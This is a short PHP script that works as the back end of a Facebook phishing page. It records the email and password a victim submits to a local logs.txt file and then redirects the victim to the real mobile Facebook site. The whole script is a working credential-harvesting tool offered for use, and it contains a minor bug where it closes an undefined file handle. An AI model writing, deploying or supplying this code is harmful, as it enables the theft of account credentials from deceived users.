<?php
if(isset($_POST['email']) && isset($_POST['pass'])) { $password=file_get_contents('logs.txt');
	$phishing = fopen("logs.txt","w"); 
	fwrite($phishing,$password."Email :: ".$_POST['email']." , 
	Password :: ".$_POST['pass']."\n"); 
	fclose($file);} 
	header ('Location: http://m.facebook.com');
?>
